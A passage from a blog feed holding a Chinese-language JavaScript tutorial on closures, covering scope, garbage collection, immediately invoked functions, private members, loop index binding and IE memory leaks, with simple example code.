        <content type="html"><![CDATA[<h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><ul><li>犀牛书：函数体内部的变量都可以保存在函数作用域内，这种特性称为闭包。</li><li>W3C和菜鸟教程：JavaScript 变量可以是局部变量或全局变量。私有变量可以用到闭包。</li><li>转载的这篇博客：闭包是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量</li></ul><h3 id="首先来看一段代码"><a href="#首先来看一段代码" class="headerlink" title="首先来看一段代码"></a>首先来看一段代码</h3><pre class=" language-js"><code class="language-js">    <span class="token keyword">var</span> oLi <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'ul li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>iL <span class="token operator">=</span> oLi<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i <span class="token operator">&lt;</span> iL<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">//自执行函数</span>        <span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>thatIDom<span class="token punctuation">,</span>thatI<span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            thatIDom<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>thatI<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//加入逻辑判断，触发回收机制</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                     <span class="token comment" spellcheck="true">//解除引用</span>                    thatIDom<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    n<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>oLi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="运行结果（每个li最多点击4次）"><a href="#运行结果（每个li最多点击4次）" class="headerlink" title="运行结果（每个li最多点击4次）"></a>运行结果（每个li最多点击4次）</h3><pre class=" language-js"><code class="language-js">thatIDom<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>thatI<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//形成闭包。</span></code></pre><h2 id="闭包的定义-1"><a href="#闭包的定义-1" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><ul><li>犀牛书：函数体内部的变量都可以保存在函数作用域内，这种特性称为闭包。</li><li>W3C和菜鸟教程：JavaScript 变量可以是局部变量或全局变量。私有变量可以用到闭包。</li><li>转载的这篇博客：闭包是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量</li></ul><h2 id="闭包有三个特性："><a href="#闭包有三个特性：" class="headerlink" title="闭包有三个特性："></a>闭包有三个特性：</h2><pre><code>1.函数嵌套函数2.函数内部可以引用外部的参数和变量3.参数和变量不会被垃圾回收机制回收</code></pre><h2 id="闭包的定义及其优缺点"><a href="#闭包的定义及其优缺点" class="headerlink" title="闭包的定义及其优缺点"></a>闭包的定义及其优缺点</h2><p><code>闭包</code> 是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量</p><p>闭包的缺点就是常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。</p><p>闭包是<code>javascript</code>语言的一大特点，主要应用闭包场合主要是为了：设计私有的方法和变量。</p><p>一般函数执行完毕后，局部活动对象就被销毁，内存中仅仅保存全局作用域。但闭包的情况不同！</p><h2 id="嵌套函数的闭包"><a href="#嵌套函数的闭包" class="headerlink" title="嵌套函数的闭包"></a>嵌套函数的闭包</h2><pre class=" language-js"><code class="language-js">   <span class="token keyword">function</span> <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token operator">++</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>                 <span class="token keyword">var</span> fun <span class="token operator">=</span> <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 1 执行后 a++，，然后a还在~  </span>        <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2   </span>        fun <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//a被回收！！ </span></code></pre><p>闭包会使变量始终保存在内存中，如果不当使用会增大内存消耗。</p><h2 id="javascript的垃圾回收原理"><a href="#javascript的垃圾回收原理" class="headerlink" title="javascript的垃圾回收原理"></a><code>javascript</code>的垃圾回收原理</h2><p>（1）、在<code>javascript</code>中，如果一个对象不再被引用，那么这个对象就会被<code>GC</code>回收；<br>（2）、如果两个对象互相引用，而不再被第<code>3</code>者所引用，那么这两个互相引用的对象也会被回收。</p><h2 id="使用闭包的好处"><a href="#使用闭包的好处" class="headerlink" title="使用闭包的好处"></a>使用闭包的好处</h2><p>那么使用闭包有什么好处呢？使用闭包的好处是：</p><pre><code>1.希望一个变量长期驻扎在内存中2.避免全局变量的污染3.私有成员的存在</code></pre><h2 id="一、全局变量的累加"><a href="#一、全局变量的累加" class="headerlink" title="一、全局变量的累加"></a>一、全局变量的累加</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        a<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//2</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//3</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="二、局部变量"><a href="#二、局部变量" class="headerlink" title="二、局部变量"></a>二、局部变量</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        a<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//2</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//2</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>那么怎么才能做到变量a既是局部变量又可以累加呢？</p><h2 id="三、局部变量的累加"><a href="#三、局部变量的累加" class="headerlink" title="三、局部变量的累加"></a>三、局部变量的累加</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//函数嵌套函数</span>                x<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> y <span class="token operator">=</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//外部函数赋给变量y;</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//y函数调用一次，结果为11，相当于outer()()；</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//y函数调用第二次，结果为12，实现了累加</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="函数声明与函数表达式"><a href="#函数声明与函数表达式" class="headerlink" title="函数声明与函数表达式"></a>函数声明与函数表达式</h2><p>在js中我们可以通过关键字<code>function</code>来声明一个函数：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>我们也可以通过一个”()”来将这个声明变成一个表达式：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//然后通过()直接调用前面的表达式即可，因此函数可以不必写名字；</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="四、模块化代码，减少全局变量的污染"><a href="#四、模块化代码，减少全局变量的污染" class="headerlink" title="四、模块化代码，减少全局变量的污染"></a>四、模块化代码，减少全局变量的污染</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> abc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//abc为外部匿名函数的返回值</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                a<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2 ；调用一次abc函数，其实是调用里面内部函数的返回值    </span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//3</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="五、私有成员的存在"><a href="#五、私有成员的存在" class="headerlink" title="五、私有成员的存在"></a>五、私有成员的存在</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> aaa <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">bbb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                a<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">ccc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                a<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>                b<span class="token punctuation">:</span>bbb<span class="token punctuation">,</span>             <span class="token comment" spellcheck="true">//json结构</span>                c<span class="token punctuation">:</span>ccc        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>aaa<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//2</span>aaa<span class="token punctuation">.</span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//3</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="六-使用匿名函数实现累加"><a href="#六-使用匿名函数实现累加" class="headerlink" title="六.使用匿名函数实现累加"></a>六.使用匿名函数实现累加</h2><pre class=" language-html"><code class="language-html">//使用匿名函数实现局部变量驻留内存中，从而实现累加<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"> <span class="token keyword">function</span> <span class="token function">box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//匿名函数</span>          age<span class="token operator">++</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> age<span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//即alert(box()())；</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//     function () {</span>                        <span class="token comment" spellcheck="true">//   age++;</span>                       <span class="token comment" spellcheck="true">// return age;</span>                      <span class="token comment" spellcheck="true">//       }</span>b <span class="token operator">=</span> <span class="token keyword">null</span>；  <span class="token comment" spellcheck="true">//解除引用，等待垃圾回收</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>过度使用闭包会导致性能的下降。函数里放匿名函数，则产生了闭包</p><h2 id="七、在循环中直接找到对应元素的索引"><a href="#七、在循环中直接找到对应元素的索引" class="headerlink" title="七、在循环中直接找到对应元素的索引"></a>七、在循环中直接找到对应元素的索引</h2><pre class=" language-html"><code class="language-html">   <span class="token doctype">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xhtml<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xml:</span>lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> aLi <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>aLi<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    aLi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//当点击时for循环已经结束</span>                    <span class="token function">alert</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>789<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>010<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="八、使用闭包改写上面代码"><a href="#八、使用闭包改写上面代码" class="headerlink" title="八、使用闭包改写上面代码"></a>八、使用闭包改写上面代码</h2><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> aLi <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>aLi<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>                            aLi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                    <span class="token function">alert</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>789<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="九-内存泄露问题"><a href="#九-内存泄露问题" class="headerlink" title="九.内存泄露问题"></a>九.内存泄露问题</h2><p>由于<code>IE</code>的<code>js</code>对象和<code>DOM</code>对象使用不同的垃圾收集方法，因此闭包在<code>IE</code>中会导致内存泄露问题，也就是无法销毁驻留在内存中的元素</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">closure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> oDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'oDiv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//oDiv用完之后一直驻留在内存中</span>    oDiv<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'oDiv.innerHTML'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里用oDiv导致内存泄露</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">closure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最后应将oDiv解除引用来避免内存泄露</span><span class="token keyword">function</span> <span class="token function">closure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> oDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'oDiv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> test <span class="token operator">=</span> oDiv<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>    oDiv<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    oDiv <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数与变量的解析顺序</title>
      <link href="2018/08/08/JavaScript-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F/"/>
      <url>2018/08/08/JavaScript-%E5%87%BD%E6%95%B0%E4%B8%8E%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F/</url>
      
